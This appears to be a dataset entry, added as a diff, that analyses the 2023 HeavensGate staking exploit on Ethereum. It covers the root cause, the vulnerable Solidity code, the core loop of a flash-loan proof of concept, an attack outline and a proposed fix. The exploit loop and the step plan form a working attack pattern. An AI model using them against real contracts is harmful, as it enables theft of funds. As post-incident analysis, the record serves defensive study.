@@ -1,0 +1,33 @@
+{
+ "id": "2023__2023-09-01_HeavensGate_TokenLogic",
+ "source_file": "2023/2023-09-01_HeavensGate_TokenLogic.md",
+ "title": "HeavensGate — Token Logic Vulnerability Analysis",
+ "date": "2023-09-01",
+ "protocol": "HeavensGate",
+ "chain": "Ethereum",
+ "loss_raw": "~8 ETH",
+ "loss_usd": null,
+ "root_cause": "The `stake()` function calls `rebase()` before distributing sHATE, and `unstake()` also triggers `rebase()` when `_rebase=true`. Cycling stake/unstake forces multiple epoch advances within one transaction, inflating the amount of HATE receivable on each unstake",
+ "attack_tx": "0xe28ca1f43036f476...",
+ "vulnerable_contract": "HeavensGate Staking 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8 (0x8faa53a742fc732b... in the PoC is the attacker's flash-loan contract)",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "// From: contracts/Staking.sol\n\nIERC20 public immutable HATE;\nIsHATE public immutable sHATE;  // rebasing staked token — circulatingSupply() inflates on each rebase\n\nstruct Epoch {\n    uint256 length;    // in seconds\n    uint256 number;    // since inception\n    uint256 end;       // timestamp\n    uint256 distribute;// amount to distribute next rebase\n}\nEpoch public epoch;\n\nfunction stake(address _to, uint256 _amount) external {\n    HATE.transferFrom(msg.sender, address(this), _amount);\n    rebase();                       // ❌ rebase() called BEFORE sHATE.transfer, inflating sHATE supply\n    sHATE.transfer(_to, _amount);  // ❌ transfers _amount of sHATE but sHATE has just rebased upward\n}\n\nfunction unstake(address _to, uint256 _amount, bool _rebase) external {\n    if (_rebase) rebase();          // ❌ rebase() called again inside unstake when _rebase=true\n    sHATE.transferFrom(msg.sender, address(this), _amount);\n    require(_amount <= HATE.balanceOf(address(this)), \"Insufficient HATE balance in contract\");\n    HATE.transfer(_to, _amount);   // ❌ returns same _amount of HATE regardless of rebase inflation\n}\n\nfunction rebase() public {\n    if (epoch.end <= block.timestamp) {\n        sHATE.rebase(epoch.distribute, epoch.number); // inflates sHATE total supply\n\n        epoch.end = epoch.end + epoch.length;\n        epoch.number++;\n\n        if (address(distributor) != address(0)) {\n            distributor.distribute();\n        }\n\n        uint256 balance = HATE.balanceOf(address(this));\n        uint256 staked = sHATE.circulatingSupply();\n\n        if (balance <= staked) {\n            epoch.distribute = 0;\n        } else {\n            epoch.distribute = balance - staked; // ❌ distribute > 0 as long as HATE balance exceeds sHATE supply\n        }\n    }\n}",
+  "// From DeFiHackLabs HeavensGate_exp.sol (verbatim core logic)\n\nfunction uniswapV2Call(address, uint256 amount0, uint256, bytes calldata data) external {\n    uint256 i = 0;\n    while (i < uint8(data[0])) {           // data[0] = loop count (3 or 30)\n        uint256 balanceAttacker = HATE.balanceOf(address(this));\n        HATEStaking.stake(address(this), balanceAttacker);   // ❌ triggers rebase inside stake\n        uint256 sTokenBalance = sHATE.balanceOf(address(this));\n        HATEStaking.unstake(address(this), sTokenBalance, true); // ❌ _rebase=true triggers another rebase\n        // Each cycle: HATE returned grows because epoch.distribute increased from prior rebase\n        i += 1;\n    }\n    HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: prevent mid-transaction rebase exploitation\nfunction stake(address _to, uint256 _amount) external {\n    rebase(); // rebase before receiving HATE, not after\n    HATE.transferFrom(msg.sender, address(this), _amount);\n    sHATE.transfer(_to, _amount);\n}\n// Also: add a per-epoch stake/unstake cooldown or restrict rebase() to distributor-only calls."
+ ],
+ "steps": [
+  "a. stake(address(this), HATE_balance) → rebase() fires → sHATE inflated",
+  "b. unstake(address(this), sHATE_balance, true) → rebase() fires again",
+  "→ HATE returned = _amount (pre-rebase) but sHATE was worth more post-rebase",
+  "→ net HATE extracted > deposited each cycle",
+  "④ Swap remaining surplus HATE → WETH for profit (~8 ETH total)"
+ ],
+ "other_code": [
+  "Attacker\n  ├─① Flash borrow HATE from HATE/ETH Uniswap pair (90% of pool)\n  │\n  ├─② Loop N times (3 times in Exploit1, 30 times in Exploit2):\n  │     a. stake(address(this), HATE_balance)    → rebase() fires → sHATE inflated\n  │     b. unstake(address(this), sHATE_balance, true) → rebase() fires again\n  │        → HATE returned = _amount (pre-rebase) but sHATE was worth more post-rebase\n  │        → net HATE extracted > deposited each cycle\n  │\n  ├─③ Repay flash loan (amount * 1000/997 + 1)\n  │\n  └─④ Swap remaining surplus HATE → WETH for profit (~8 ETH total)"
+ ]
+}
